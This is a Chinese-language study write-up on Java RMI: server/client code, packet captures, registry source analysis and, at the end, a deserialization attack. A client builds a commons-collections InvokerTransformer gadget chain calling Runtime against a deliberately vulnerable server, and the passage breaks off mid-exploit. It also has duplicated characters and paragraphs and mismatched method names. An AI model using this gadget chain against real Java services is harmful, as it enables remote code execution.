RMI全称是Remote Method Invocation，远程⽅方法调⽤用。从这个名字就可以看出，他的⽬目标和RPC其实 是类似的，是让某个Java虚拟机上的对象调⽤用另⼀一个Java虚拟机中对象上的⽅方法，只不不过RMI是Java独 有的⼀一种机制。

使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现`java.io.Serializable`接口，并且客户端的`serialVersionUID`字段要与服务器端保持一致。
## 远程对象
使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现`java.io.Serializable`接口，并且客户端的`serialVersionUID`字段要与服务器端保持一致。

任何可以被远程调用方法的对象必须继承`java.rmi.Remote`接口，远程对象的实现类必须继承`UnicastRemoteObject`类。如果不继承`UnicastRemoteObject`类，则需要手工初始化远程对象，在远程对象的构造方法的调用`UnicastRemoteObject.exportObject()`静态方法，RMI服务示例如下
```java
  
  
import java.rmi.Naming;  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.rmi.server.UnicastRemoteObject;  
public class RMIServer {  
    public interface IRemoteHelloWorld extends Remote {  
        public String hello() throws RemoteException;  
    }  
    public class RemoteHelloWorld extends UnicastRemoteObject implements  
            IRemoteHelloWorld {  
        protected RemoteHelloWorld() throws RemoteException {  
            super();  
        }  
        public String hello() throws RemoteException {  
            System.out.println("call from");  
            return "Hello world";  
        }  
    }  
    private void start() throws Exception {  
        RemoteHelloWorld h = new RemoteHelloWorld();  
        LocateRegistry.createRegistry(1099);  //创建并运行RMI registry
        Naming.rebind("rmi://127.0.0.1:1099/Hello", h);  //将RemoteHelloWorld对象绑定到Hello这个名字上
    }  
    public static void main(String[] args) throws Exception {  
        new RMIServer().start();  
    }  
}
```
`Naming.bind` 的第一个参数是一个URL，形如： `rmi://host:port/name` 。其中，host和port就是 `RMI Registry`的地址和端口，name是远程对象的名字。
如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认 是 1099
```java
Naming.bind("Hello", new RemoteHelloWorld());
```
一个RMI Server分为三部分： 
1. 一个继承了了 `java.rmi.Remote` 的接⼝口，其中定义我们要远程调⽤用的函数，⽐比如这⾥里里的 hello() 
2. 一个实现了了此接⼝口的类 
3. 一个主类，⽤用来创建`Registry`，并将上⾯面的类实例例化后绑定到一个地址。这就是我们所谓的Server 了了。
这个代码实现了远程接口
```java
public class RemoteHelloWorld extends UnicastRemoteObject implements  
        IRemoteHelloWorld { //实现远程接口 ，继承UnicastRemoteObject类才可以被远程调用，Java 会在后台自动为你处理 Socket 连接，并将该类变成一个可以监听网络请求的“服务器”对象。  
    protected RemoteHelloWorld() throws RemoteException {  
        super();  
    }
```
在 Java 中，普通的类只存在于内存中，无法处理网络数据包。当你调用 `super()` 时，父类 `UnicastRemoteObject` 的构造函数会执行以下操作：
- **开启监听端口**：它会自动打开一个匿名的 TCP 端口（或者你指定的端口）。
- **创建存根（Stub）**：它会生成一个代理对象。当客户端调用方法时，实际上是调用这个 Stub，Stub 再通过网络把请求发给服务端。
- **发布服务**：将你的对象实例“导出”到 RMI 运行时环境，使其能够接收并处理来自远程的 TCP 连接。
接下来再编写一个客户端(client)
```java
import java.rmi.Naming;  
import java.rmi.NotBoundException;  
import java.rmi.RemoteException;  
public class TrainMain {  
    public static void main(String[] args) throws Exception {  
        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)  
                Naming.lookup("rmi://192.168.221.1:1099/Hello"); //用Naming.lookup()从注册表中发起查询，寻找到Hello对象，接下来就可以像在本地一样操作了  
        String ret = hello.hello();//调用函数  
        System.out.println( ret);  
    }  
}
```
其中`192.168.221.1`必须是主机的真实内网ip地址，本地测试的话用`127.0.0.1`也可以。
先运行`RMIServer.java`这样服务器就会启动，再运行`TrainMain`客户端就会连接并调用服务的`hello()`函数，打印出`hello world`
这就是一个简单的RMI
为了理解通信过程，用wireshark抓一下包。
因为是本地测试，所以wireshark选择`Adapter for loopback traffic capture`，运行一下服务，过滤一下`tcp.port == 1099`，这样就可以看到之间的包。
可以看到![](image/360.png)
这就是完整的通信过程，我们可以发现，整个过程进⾏行行了了两次TCP握⼿手，也就是我们实际建⽴立了了两次 TCP连接。
第⼀次建立TCP连接是连接远端 `127.0.0.1` 的 `1099` 端口 ，就是我们在代码里看到的端口，⼆ 者进行沟通后，客户端向远端发送了⼀个 “Call” 消息，远端回复了⼀个 “ReturnData” 消息，然后客户端新建了⼀ 个TCP连接，连到远端的 `7260` 端口。
那么为什么我会连接7260端⼝呢？
细细阅读数据包我们会发现，在“ReturnData”这个包中，返回了了⽬目标的IP地址`192.168.221.1`
```
00000000 4a 52 4d 49 00 02 4b JRMI..K
00000000 4e 00 09 31 32 37 2e 30 2e 30 2e 31 00 00 1c 4f N..127.0 .0.1...O
00000007 00 0a 31 37 32 2e 32 37 2e 30 2e 31 00 00 1c 4e ..172.27 .0.1...N
00000017 50 ac ed 00 05 77 22 00 00 00 00 00 00 00 00 00 P....w". ........
00000027 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........
00000037 03 44 15 4d c9 d4 e6 3b df 74 00 05 48 65 6c 6c .D.M...; .t..Hell
00000047 6f 73 7d 00 00 00 02 00 0f 6a 61 76 61 2e 72 6d os}..... .java.rm
00000057 69 2e 52 65 6d 6f 74 65 00 1b 52 4d 49 53 65 72 i.Remote ..RMISer
00000067 76 65 72 24 49 52 65 6d 6f 74 65 48 65 6c 6c 6f ver$IRem oteHello
00000077 57 6f 72 6c 64 70 78 72 00 17 6a 61 76 61 2e 6c Worldpxr ..java.l
00000087 61 6e 67 2e 72 65 66 6c 65 63 74 2e 50 72 6f 78 ang.refl ect.Prox
00000097 79 e1 27 da 20 cc 10 43 cb 02 00 01 4c 00 01 68 y.'. ..C ....L..h
000000A7 74 00 25 4c 6a 61 76 61 2f 6c 61 6e 67 2f 72 65 t.%Ljava /lang/re
000000B7 66 6c 65 63 74 2f 49 6e 76 6f 63 61 74 69 6f 6e flect/In vocation
000000C7 48 61 6e 64 6c 65 72 3b 70 78 70 73 72 00 2d 6a Handler; pxpsr.-j
000000D7 61 76 61 2e 72 6d 69 2e 73 65 72 76 65 72 2e 52 ava.rmi. server.R
000000E7 65 6d 6f 74 65 4f 62 6a 65 63 74 49 6e 76 6f 63 emoteObj ectInvoc
000000F7 61 74 69 6f 6e 48 61 6e 64 6c 65 72 00 00 00 00 ationHan dler....
00000107 00 00 00 02 02 00 00 70 78 72 00 1c 6a 61 76 61 .......p xr..java
00000117 2e 72 6d 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f .rmi.ser ver.Remo
00000127 74 65 4f 62 6a 65 63 74 d3 61 b4 91 0c 61 33 1e teObject .a...a3.
00000137 03 00 00 70 78 70 77 33 00 0a 55 6e 69 63 61 73 ...pxpw3 ..Unicas
00000147 74 52 65 66 00 0a 31 37 32 2e 32 37 2e 30 2e 31 tRef..17 2.27.0.1
00000157 00 00 1c 4e be f1 16 fe 28 f5 53 61 a2 08 ff ae ...N.... (.Sa....
00000167 00 00 01 9c e2 19 17 01 80 01 00 78 ........ ...x
00000010 51 ac ed 00 05 77 0f 01 a2 08 ff ae 00 00 01 9c Q....w.. ........
00000020 e2 19 17 01 80 04 ......
```
其 后跟的⼀一个字节 `\x00\x00\x1c\x4e` ，刚好就是整数 `7260`的⽹网络序列列：
其实这段数据流中从 \xAC\xED 开始往后就是Java序列列化数据了了，IP和端⼝只是这个对象的一部分罢了。
## 攻击RMI Registry
首先，RMI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直 接访问“后台”功能，比如修改远程服务器上Hello对应的对象：
```java
RemoteHelloWorld h = new RemoteHelloWorld(); Naming.rebind("rmi://192.168.135.142:1099/Hello", h);
```
不再是`127.0.0.1`本地地址了，而这样就会报错。原来Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。
为了模拟真实环境，我把`server`和`client`一个放在WSL上，一个放在windows主机上。
可以成功调用，如果将`RMIServer`的
```java
Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
```
改为
```java
Naming.rebind("rmi://192.168.221.1:1099/Hello", h);
```
再执行就会报错
![](image/361.png)
原来Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。
不过`list`和`lookup`方法可以远程调用。
list方法可以列出目标上所有绑定的对象：
```java
String[] s = Naming.list("rmi://192.168.221.1:1099/");  
System.out.println(s[0]);
```
输出
```
//192.168.221.1:1099/Hello
```
lookup作用就是获得某个远程对象
那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，
## RMI利用codebase执行任意代码
复现条件太苛刻，就不复现了。
在实战中很难遇到


## 序列化数据分析
再抓一次包，
![](image/362.png)
可以看到那个RMI协议的Call包，点开看一下
![](image/363.png)
可以看到他是以`\xac\xed`开头的，这是一段java序列化数据，我们可以使用`SerializationDumper`对Java序列化数据进行分析
```
D:\CTF_tools\SerializationDumper>java -jar SerializationDumper-v1.14.jar "aced00057722000000000000000000000000000000000000000000000000000144154dc9d4e63bdf"

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_BLOCKDATA - 0x77
    Length - 34 - 0x22
    Contents - 0x000000000000000000000000000000000000000000000000000144154dc9d4e63bdf
```
## RMI机制分析
使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现`java.io.Serializable`接口，并且客户端的`serialVersionUID`字段要与服务器端保持一致。
任何可以被远程调用方法的对象必须继承`java.rmi.Remote`接口，远程对象的实现类必须继承`UnicastRemoteObject`类。如果不继承`UnicastRemoteObject`类，则需要手工初始化远程对象，在远程对象的构造方法的调用`UnicastRemoteObject.exportObject()`静态方法，如下
RMIServer.java
```java
package learn.rmi;  
  
import java.rmi.server.UnicastRemoteObject;  
import java.rmi.RemoteException;  
  
public class RMIServer {  
    public class RMIHello extends UnicastRemoteObject implements IHello{  
        protected RMIHello() throws RemoteException {  
            super();  
        }  
        //      在没有继承UnicastRemoteObject的时候构造函数也可以写成如下形式  
//      protected RMIHello() throws RemoteException{  
//          UnicastRemoteObject.exportObject(this,0);  
//      }  
  
        @Override  
        public String sayHello(String name) throws RemoteException {  
            System.out.println("Hello World!");  
            return "Xin";  
        }  
    }  
}
```
IHello.java
```java
package learn.rmi;  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
  
public interface IHello extends Remote {  
    public String sayHello(String name) throws RemoteException;  
}
```
`IHello`是客户端和服务端共用的接口（客户端本地必须有远程对象的接口，不然无法指定要调用的方法，而且其**全限定名**必须与服务器上的对象完全相同），`RMIHello`是一个服务端远程对象，提供了一个`sayHello`方法供远程调用。
这就是一个RMI Server
- 一个继承了`java.rmi.Remote`的接口`IHello`，内部定义了我们将要远程调用的对象方法`sayHello()`
- 一个实现了此接口的类`RMIHello`
- 一个主类`RMIServer`，用来创建`Registry`，并将类`RMIHello`实例化后绑定到一个地址
### 本地对象调用
```java
ObjectClass objectA = new ObjectClass();  
String retn = objectA.Method();  
```
但如果对象在JVM A上，而客户端运行在JVM B上，那么B怎么访问A上的对象呢？这就需要RMI机制了。
### 远程对象调用
在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub（存根），Stub相当于远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节。而位于服务器端的Skeleton（骨架）,能够读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。所以RMI远程调用逻辑大致是这样的
![](image/364.png)
从逻辑上来看，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。
具体的通信流程如下

- Server监听一个端口，这个端口是JVM随机选择的
- Client并不知道Server远程对象的通信地址和端口，但是位于Client的Stub中包含了这些信息，并封装了底层网络操作。Client可以调用Stub上的方法，并且也可以向Stub发送方法参数。
- Stub连接到Server监听的通信端口并提交参数
- Server执行具体的方法，并将结果返回给Stub
- Stub返回执行结果给Client。因此在Clinet看来，就好像是Stub在本地执行了这个方法。
那么问题来了，位于Client上的Stub是怎么获取到远程Server的通信信息的呢？这就需要使用RMI Registry了。
### RMI Registry的注册
JDK提供了一个RMI注册表（RMI Registry）来解决这个问题。RMI Registry也是一个远程对象，默认监听在1099端口上，可以使用代码启动RMI Registry，也可以使用rmiregistry命令。

要注册远程对象，需要RMI URL和一个远程对象的引用
```java
private void register() throws Exception {  
    RMIHello rmihello = new RMIHello();  
    LocateRegistry.createRegistry(1099);  
    Naming.rebind("rmi://127.0.0.1:1099/Hello", rmihello);  
}
```
在主类的`register()`方法中，我们首先实例化了一个将被远程调用的类`RMIHello`，然后使用 `LocateRegistry.createRegistry(port)`在本地的某个端口上创建了一个`Registry`。最后使用`Naming.bind()`将实例化对象和地址上的`hello`绑定在一起，作为远程对象的名字。注意这里使用的是`rmi://`协议。

这样，我们就完成了对RMI Registry的注册。
### RMI Registry的使用
注册完RMI Registry以后，我们将要调用的远程对象已经和服务器端的某个地址绑定在了一起。那么Clinet又是怎么从Registry获取服务器远程对象信息的呢？我们创建一个简单的RMI Client，代码如下
```java
package learn.rmi;  
  
import java.rmi.Naming;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class RMIClient {  
    public static void main(String[] args) throws Exception {  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  
        IHello ihello = (IHello) registry.lookup("Hello");  
        System.out.println(ihello.sayHello("Xin"));  
    }  
}
```
`LocateRegistry.getRegistry()`会使用给定的主机和端口等信息在本地创建一个`Stub`对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。这里我们使用了`registry.lookup()`来查询获取注册表中的远程对象。
使用了RMI Registry后，RMI的调用关系如下
![](image/365.png)
### 完整代码
**服务器端**
IHello.java
```java
package learn.rmi;  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
  
public interface IHello extends Remote {//定义远程接口  
    public String sayHello(String name) throws RemoteException;  
}
```
RMIServer.java
```java
package learn.rmi;  
  
import java.rmi.Naming;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.server.UnicastRemoteObject;  
import java.rmi.RemoteException;  
  
public class RMIServer {  
    public class RMIHello extends UnicastRemoteObject implements IHello{//实现远程接口  
        protected RMIHello() throws RemoteException {  
            super();  
        }  
        //      在没有继承UnicastRemoteObject的时候构造函数也可以写成如下形式  
//      protected RMIHello() throws RemoteException{  
//          UnicastRemoteObject.exportObject(this,0);  
//      }  
  
        @Override  
        public String sayHello(String name) throws RemoteException {//供调用的 方法  
            System.out.println("Hello World!");  
            return "Xin";  
        }  
    }  
    private void register() throws Exception {  
        RMIHello rmihello = new RMIHello();  
        LocateRegistry.createRegistry(1099);  
        Naming.rebind("rmi://127.0.0.1:1099/Hello", rmihello);  
    }  
    public static void main(String[] args) throws Exception {  
        new RMIServer().register();  
    }  
  
}
```
**客户端**
RMIClient.java
```java
package learn.rmi;  
  
import java.rmi.Naming;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class RMIClient {  
    public static void main(String[] args) throws Exception {  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  
        IHello ihello = (IHello) registry.lookup("Hello");  
        System.out.println(ihello.sayHello("Xin"));  
    }  
}
```
运行后就可以调用函数`sayHello`
服务端输出`Hello World`
客户端输出`Xin`
Clien成功调用位于Server端的远程对象方法。
## JRMP协议分析
Java远程方法协议（Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议。
为了便于分析，我们将Cilent打包复制到另一台虚拟机中。启动RMI Server，然后在虚拟机中向RMI Server发出请求，截获的数据包如下
首先是TCP三次握手来建立第一条TCP链接，客户端连接服务器的1099端口，这里真正连接到的其实是RMI Registry，然后二者建立JRMP链接。
随后Clinet向Registry发送”Call”信息，Registry回复”ReturnData”。我们看一下Registry的回复内容。
```
0000   00 0c 29 b3 84 37 14 18 c3 e1 a9 29 08 00 45 00  ..)..7.....)..E.
0010   01 62 3d 67 40 00 80 06 00 00 c0 a8 2b a2 c0 a8  .b=g@.......+...
0020   2b 0a 04 4b b5 d0 a1 2c d2 91 8b 75 e2 86 50 18  +..K...,...u..P.
0030   08 04 d9 51 00 00 51 ac ed 00 05 77 0f 01 82 3c  ...Q..Q....w...<
0040   5d f8 00 00 01 7e 4c 4d 6c e9 80 05 73 7d 00 00  ]....~LMl...s}..
0050   00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52 65 6d  ....java.rmi.Rem
0060   6f 74 65 00 10 6c 65 61 72 6e 2e 72 6d 69 2e 49  ote..learn.rmi.I
0070   48 65 6c 6c 6f 70 78 72 00 17 6a 61 76 61 2e 6c  Hellopxr..java.l
0080   61 6e 67 2e 72 65 66 6c 65 63 74 2e 50 72 6f 78  ang.reflect.Prox
0090   79 e1 27 da 20 cc 10 43 cb 02 00 01 4c 00 01 68  y.'. ..C....L..h
00a0   74 00 25 4c 6a 61 76 61 2f 6c 61 6e 67 2f 72 65  t.%Ljava/lang/re
00b0   66 6c 65 63 74 2f 49 6e 76 6f 63 61 74 69 6f 6e  flect/Invocation
00c0   48 61 6e 64 6c 65 72 3b 70 78 70 73 72 00 2d 6a  Handler;pxpsr.-j
00d0   61 76 61 2e 72 6d 69 2e 73 65 72 76 65 72 2e 52  ava.rmi.server.R
00e0   65 6d 6f 74 65 4f 62 6a 65 63 74 49 6e 76 6f 63  emoteObjectInvoc
00f0   61 74 69 6f 6e 48 61 6e 64 6c 65 72 00 00 00 00  ationHandler....
0100   00 00 00 02 02 00 00 70 78 72 00 1c 6a 61 76 61  .......pxr..java
0110   2e 72 6d 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f  .rmi.server.Remo
0120   74 65 4f 62 6a 65 63 74 d3 61 b4 91 0c 61 33 1e  teObject.a...a3.
0130   03 00 00 70 78 70 77 37 00 0a 55 6e 69 63 61 73  ...pxpw7..Unicas
0140   74 52 65 66 00 0e 31 39 32 2e 31 36 38 2e 34 33  tRef..192.168.43
0150   2e 31 36 32 00 00 ec 3c ba 3f a1 47 ea 85 db bb  .162...<.?.G....
0160   82 3c 5d f8 00 00 01 7e 4c 4d 6c e9 80 01 01 78  .<]....~LMl....x
```
这里传输的是服务器的序列化数据。注意以上加粗倾斜的部分。`\xAC\xED`是Java序列化的魔术头，该数据流往后的部分就是序列化的内容了。`\xEC\x3C`转换成十进制为`60476`，这便是Server在本地开放的随机端口。
我们分析一下第一条TCP链接干了什么。首先Client根据传入的rmi地址链接远端服务器1099端口上的RMI Registry，然后Registry向Client发送Server上的序列化数据，包括IP和开放的随机端口等。

再往下是第二个TCP链接，Client连接ReturnData中返回的端口，这条TCP链接用于Client与Server之间的传输数据。实际上是Client的Stub和Server上的Skeleton之间进行数据传输的。
再往下是第二个TCP链接，Client连接ReturnData中返回的端口，这条TCP链接用于Client与Server之间的传输数据。实际上是Client的Stub和Server上的Skeleton之间进行数据传输的。
再往后就是四次挥手，两条TCP链接分别断开
RMI Registry就像一个网关，Server在Registry中注册绑定在name上的远程对象，Client在Registry中根据name查询远程对象绑定信息。然后Client的Stub连接位于Server上的Skeleton，最终远程方法还是在服务器上执行。
## RMI流程源码分析
### 创建Registry端
我们可以通过`createRegistry()`方法来创建一个Registry
```java
LocateRegistry.createRegistry(1099);
```
`ctrl+右键`进入源码看
```java
public static Registry createRegistry(int port) throws RemoteException {  
    return new RegistryImpl(port);  
}
```
可以看到，在创建Registry是返回的是`RegistryImpl`对象
```java
private void setup(UnicastServerRef uref)  
    throws RemoteException  
{  
    /* Server ref must be created and assigned before remote  
     * object 'this' can be exported.     */    ref = uref;  
    uref.exportObject(this, null, true);  
}
```
继续跟进`UnicastServerRef.exportObject()`
```java
if (stub instanceof RemoteStub) {  
    setSkeleton(impl);  
}
```
在其中创建了一个Skeleton（骨架），跟进
```java
String skelname = cl.getName() + "_Skel";  
try {  
    Class<?> skelcl = Class.forName(skelname, false, cl.getClassLoader());  
  
    return (Skeleton)skelcl.newInstance();
```
最终在`Util.createSkeleton()`中返回了`RegistryImpl_Skel`对象，这就是Server端处理 RMI Client 通信请求的具体操作类（Skeleton）。


### 操作远程对象
对远程对象的操作有以下5种

- bind
- list
- lookup
- rebind
- unbind
对于Registry端，操作远程对象其实就是操作`HashTable`，我们来看`RegistryImpl`中的`bind`操作
```java
public void bind(String name, Remote obj)  
    throws RemoteException, AlreadyBoundException, AccessException  
{  
    // The access check preventing remote access is done in the skeleton  
    // and is not applicable to local access.    synchronized (bindings) {  
        Remote curr = bindings.get(name);  
        if (curr != null)  
            throw new AlreadyBoundException(name);  
        bindings.put(name, obj);  
    }  
}
```
这里的`this.bindings`其实就是一个Hash表，Registry使用的这张Hash表就类似于一张”路由表”，将`name`和绑定其上的远程对象联系了起来。
## 利用RMI进行攻击
Java RMI机制能够让一台Java虚拟机上的对象调用运行在另一台Java虚拟机上的对象的方法。总结一下，RMI机制的实现依赖于以下三个部分

- RMI Server
- RMI Registry
- RMI Client

简单概括一下RMI的流程：Server端事先在Registry处`bind`将要被调用的远程对象。当Client需要调用远程对象时，先根据`rmi://`地址连接到Registry，然后在Registry处查看是否绑定有需要的远程对象。如果有，则Registry返回Server端的`rmi://`地址以及开放的端口，Client据此连接到Server。然后才开始真正的远程方法调用，远程方法在Server端执行，Server将执行后的结果发送给Client。

### 调用远程恶意方法
很容易想到，既然我们能够利用RMI机制直接调用远程方法，如果在Server端存在某些恶意方法，并且恰好又在Registry中注册了，那么我们岂不是可以直接调用远程恶意方法进行攻击？
我们可以通过list方法列出目标Registry上所有绑定的对象
```java
String[] s = Naming.list("rmi://127.0.0.1:1099");
//[Ljava.lang.String;@39ed3c8d
```
这里有一个[工具](https://github.com/NickstaDB/BaRMIe)，能够探测Server端注册的危险对象，我们进而通过探测出的危险对象进行攻击。不过，上述方式的攻击在实战中很难碰到，这种攻击方式远远不能达到我们的目的。
那么进一步思考，既然我们要求服务器端的恶意对象必须在Registry中注册。那么我们能不能通过Client端在Registry注册恶意对象呢？
```java
//RMI Client
registry.rebind("rmi://192.168.1.100:1099/hello",rmiHello_test);
```
但是报错了
原来Java中对于RMI Registry做了限制，只有源地址为`localhost`时才能调用`bind`、`rebind`、`unbind`等方法。所以我们并不能通过在Client端注册恶意对象的方式进行攻击。
### RMI反序列化攻击
我们知道，RMI的核心之一就是动态类加载。不管是Client，Server还是Registry，当需要操作远程对象的时候，就势必会涉及到序列化和反序列化，假如某一端调用了重写的`readObject()`方法，那么我们就可以进行反序列化攻击了。
在RMI过程中，常常会涉及到以下5个交互方式，这几种方法位于`RegistryImpl_Skel.dispatch()`中，每种方式对应的case如下

- 0->bind
- 1->list
- 2->lookup
- 3->rebind
- 4->unbind
#### list
list方法用来列出Registry上绑定的远程对象
```java
case 1:
                var2.releaseInputStream();
                String[] var97 = var6.list();
 
                try {
                    ObjectOutput var98 = var2.getResultStream(true);
                    var98.writeObject(var97);
                    break;
                } catch (IOException var92) {
                    throw new MarshalException("error marshalling return", var92);
                }
```
没有`readObject()`无法利用
#### bind&rebind
`bind`方法用来在Registry上绑定一个远程对象，`rebind`方法和`bind`方法类似
```java
#bind方法
case 0:
                try {
                    var11 = var2.getInputStream();
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var94) {
                    throw new UnmarshalException("error unmarshalling arguments", var94);
                } catch (ClassNotFoundException var95) {
                    throw new UnmarshalException("error unmarshalling arguments", var95);
                } finally {
                    var2.releaseInputStream();
                }
 
                var6.bind(var7, var8);
 
                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var93) {
                    throw new MarshalException("error marshalling return", var93);
                }
 
#rebind方法
case 3:
                try {
                    var11 = var2.getInputStream();
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var85) {
                    throw new UnmarshalException("error unmarshalling arguments", var85);
                } catch (ClassNotFoundException var86) {
                    throw new UnmarshalException("error unmarshalling arguments", var86);
                } finally {
                    var2.releaseInputStream();
                }
 
                var6.rebind(var7, var8);
 
                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var84) {
                    throw new MarshalException("error marshalling return", var84);
                }
```
可以看到`bind`和`rebind`方法中都含有`readObject()`方法。如果服务端调用了`bind`和`rebind`方法，并且安装了存在反序列化漏洞的相关组件，那么这时候我们就可以进行反序列化攻击。
#### lookup&unbind
`lookup`方法用于获取Registry上的一个远程对象，`unbind`用于解绑一个远程对象
```java
#lookup方法
case 2:
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var89) {
                    throw new UnmarshalException("error unmarshalling arguments", var89);
                } catch (ClassNotFoundException var90) {
                    throw new UnmarshalException("error unmarshalling arguments", var90);
                } finally {
                    var2.releaseInputStream();
                }
 
                var8 = var6.lookup(var7);
 
                try {
                    ObjectOutput var9 = var2.getResultStream(true);
                    var9.writeObject(var8);
                    break;
                } catch (IOException var88) {
                    throw new MarshalException("error marshalling return", var88);
                }
#unbind方法
case 4:
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var81) {
                    throw new UnmarshalException("error unmarshalling arguments", var81);
                } catch (ClassNotFoundException var82) {
                    throw new UnmarshalException("error unmarshalling arguments", var82);
                } finally {
                    var2.releaseInputStream();
                }
 
                var6.unbind(var7);
 
                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var80) {
                    throw new MarshalException("error marshalling return", var80);
                }
```
可以看到这两个方法都含有`readObject()`，不过必须为`String`类，这里我们不能直接利用，可以伪造连接请求进行利用。
### 攻击Server端
当客户端需要调用的远程方法的参数中含有Object类，此时Client可以发送一个恶意的对象。由于远程对象是以序列化形式进行传输的，Server端接收的时候势必会对其进行反序列化。如果Server端恰好安装了含有漏洞的组件，此时我们就可以进行攻击，下面我们来模拟一下。
其实这种方法本质还是传递给Server一个恶意对象，并且有以下利用条件

- Server端有能够传递Object对象的远程方法
- Server端安装有包含反序列化漏洞的相关组件
测试源码
**服务端**
ICalc.java
```java
package learn.rmi.serialize;
 
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;
 
 
public interface ICalc extends Remote {
 
    //这使用List类做参数是方便我们传递恶意对象
    public Integer sum(List<Integer> lists) throws RemoteException;
    
    //带有Object类参数的远程对象
    public Object RMI_Serialize(Object o) throws Exception;
}
```
RMIServer.java
```java
package learn.rmi.serialize;  
  
import java.rmi.Naming;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.server.UnicastRemoteObject;  
import java.util.List;  
  
public class RMIServer {  
    public class RMICalc extends UnicastRemoteObject implements ICalc {  
        protected RMICalc() throws RemoteException {  
            super();  
        }  
        @Override  
        public Integer sum(List<Integer> lists) throws RemoteException{  
            Integer result = 0;  
            for(Integer list:lists){  
                result += list;  
            }  
            return result;  
  
        }  
        @Override  
        public Object RMI_serialize(Object o) throws RemoteException{  
            System.out.println("success");  
            return o;  
        }  
  
  
    }  
    private void register() throws Exception {  
        RMICalc rmiCalc = new RMICalc();  
        LocateRegistry.createRegistry(1099);  
        Naming.rebind("rmi://0.0.0.0:1099/Calc", rmiCalc);  
        System.out.println("Register运行中...");  
    }  
    public static void main(String[] args) throws Exception {  
        new RMIServer().register();  
    }  
}
```
同时服务端配置相应带有漏洞的组件，这里我以`commons-collections3.2.1`为例
pom.xml
```xml
...
<dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
...
```
**客户端**
ICalc.java
```java
package learn.rmi.serialize;
 
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;
 
 
public interface ICalc extends Remote {
 
    //这使用List类做参数是方便我们传递恶意对象
    public Integer sum(List<Integer> lists) throws RemoteException;
 
    public Object RMI_Serialize(Object o) throws Exception;
}
```
RMIClient.java
```java
package learn.rmi.serialize;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.rmi.Naming;
import java.util.HashMap;
import java.util.Map;

public class RMIClient implements Serializable {

    public void lookup() throws Exception {

        String rmi = "rmi://172.27.0.1:1099/";
        String[] bindeds = Naming.list(rmi);
        for (String binded : bindeds) {
            System.out.println(binded);
        }

        ICalc iCalc = (ICalc) Naming.lookup("rmi://172.27.0.1:1099/calc");
        iCalc.RMI_Serialize(Exploit());
    }

    public static Object Exploit() throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
